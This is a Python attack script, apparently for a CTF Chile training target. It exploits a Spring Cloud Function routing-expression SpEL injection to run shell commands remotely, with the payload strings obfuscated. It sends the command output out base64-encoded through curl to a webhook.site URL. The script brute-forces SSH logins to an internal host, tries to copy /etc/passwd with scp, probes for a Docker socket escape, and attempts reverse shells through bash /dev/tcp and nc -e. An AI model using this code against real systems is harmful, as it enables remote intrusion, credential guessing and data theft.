#!/usr/bin/env python3
"""
CTF Chile - Establecer shell persistente y explorar host objetivo
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Intentando acceso directo al filesystem del host objetivo...")

# Probar montar filesystem remoto o acceso NFS
probe("mount_info", "cat /proc/mounts | grep -v '^/dev'")
probe("nfs_check", "showmount -e 10.160.209.1 2>/dev/null || echo 'NO_NFS'")

print("[*] Explorando servicios de red avanzados...")

# Probar diferentes métodos de conexión
probe("telnet_test", "timeout 3 echo 'test' | telnet 10.160.209.1 22 2>/dev/null | head -3")
probe("nc_banner", "timeout 2 nc -v 10.160.209.1 22 2>&1 | head -3")

print("[*] Intentando ataques de fuerza bruta SSH más específicos...")

# Probar con usuarios encontrados en passwd
users_to_try = ["root", "daemon", "bin", "sys", "sync"]
passwords_to_try = ["ctfchile", "omnivault", "vault", "chile", "infiltracion", "flag"]

for i, user in enumerate(users_to_try[:3]):  # Solo primeros 3 para no saturar
    for j, pwd in enumerate(passwords_to_try[:3]):
        probe(f"ssh_{user}_{pwd}", f"timeout 6 sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@10.160.209.1 'echo SUCCESS_LOGIN && id' 2>/dev/null || echo 'AUTH_FAILED_{user}:{pwd}'")

print("[*] Explorando métodos de exfiltración de archivos remotos...")

# Intentar copiar archivos del host remoto
probe("scp_test", "timeout 5 scp -o StrictHostKeyChecking=no root@10.160.209.1:/etc/passwd /tmp/remote_passwd 2>/dev/null && echo 'SCP_SUCCESS' || echo 'SCP_FAILED'")

print("[*] Buscando información de Docker/contenedores...")

# Ver si estamos en un entorno Docker/K8s que permita escapar
probe("docker_escape", "ls -la /var/run/docker.sock /proc/1/cgroup 2>/dev/null")
probe("container_info", "cat /proc/1/cgroup 2>/dev/null | head -5")

print("[*] Estableciendo shell reverso...")

# Intentar establecer conexión reversa más persistente
probe("reverse_shell", f"timeout 8 bash -c 'bash -i >& /dev/tcp/webhook.site/80 0>&1' 2>/dev/null || timeout 5 nc {WH.split('//')[1]} 80 -e /bin/bash 2>/dev/null || echo 'REVERSE_FAILED'")

print("[*] Explorando archivos de configuración del sistema...")

# Buscar información sobre la red y servicios
probe("network_services", "cat /etc/services | grep ssh")
probe("system_info", "cat /etc/os-release")

time.sleep(18)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=35", timeout=10)
data = r.json().get("data", [])

successful_auths = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar login SSH exitoso
            if "SUCCESS_LOGIN" in decoded and "uid=" in decoded:
                successful_auths.append(path)
                print("🎉 LOGIN SSH EXITOSO!")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

            # Detectar información útil del sistema
            if "docker" in decoded.lower() or "container" in decoded.lower():
                print("📦 Información de contenedor encontrada")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

if successful_auths:
    print(f"\n🎉 LOGINS EXITOSOS: {successful_auths}")
else:
    print("\n[*] No se encontraron accesos SSH exitosos")